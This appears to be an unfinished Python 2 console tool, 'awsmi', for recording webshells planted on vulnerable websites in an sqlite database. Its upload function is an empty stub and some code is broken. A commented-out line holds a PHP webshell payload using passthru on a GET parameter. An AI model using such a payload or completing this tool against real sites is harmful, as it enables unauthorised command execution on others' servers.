import sqlite3
import signal
import sys


#conn = sqlite3.connect(":memory:")
#cursor = conn.cursor()#setting up a memory database at the moment
#cursor.execute("create table vulnerable_sites(url text, page text, method text, uploaded_shell text, attackurl text)")

#toInsert = ['www.bing.com','about.php','get', '<?php passthru($_GET[\'cmd\']']
#cursor.execute("insert into vulnerable_sites values(?,?,?,?)",toInsert)
#conn.commit()

database_name = ""
def print_banner():
	print "        _       __          __      _    __     __  __"
	print "       / \\      \\ \\        / /     |  | |     ||  "
	print "      /   \\      \\ \\      / /      |"
	print "     /_____\\      \\ \\    / /       |"

def upload_shell():
	url = raw_input("url:")
	page = raw_input("page:")
	method = raw_input("http method:")


def help():
	print "Interactive help menu type  help <module> to get more information on a module\n"
	print "upload-shell\t\t Upload a shell to target webserver"
	print "new-database\t\t Start a new database to keep track of webshells"

def get_input():
	userinput = raw_input("awsmi>")
	try:
		functions[userinput]()
	except KeyError:
		print "caught error"

def initialize_database():
	"""
		Responsible for initializing a new database for storing user
		interactions with their webshells.Will prompt the user for a 
		database name and a new sqlite3	database will be created. The 
		only thing that will be committed is the changes to the schema
	"""
	
	name = raw_input("database name:")#prompting the user for a database name
	conn = sqlite3.connect(name)#creating the database
	cursor = conn.cursor()
	cursor.execute("create table vulnerable_sites(url text, page text, method text, uploaded_shell text, attackurl text)")
	conn.commit()

def show_shells():
	conn = sqlite3.connect(database_name)
	query = "select * from vulnerable_sites"
	cursor.execute(query)


def exit():
	sys.exit(1)

#a dictionary of functions that we can call based off
#of a user's input
functions = {
	"help":help,
	"upload-shell":upload_shell,
	"new-database":initialize_database,
	"view-shells":show_shells,
	"exit":exit,
	"quit":exit
}

def keyboardHandler(signal, frame):
		print ""
		sys.exit(0)

def main():
	#handles keyboard interrupts gracefully
	signal.signal(signal.SIGINT, keyboardHandler)	

	while 1:
		get_input()

main()
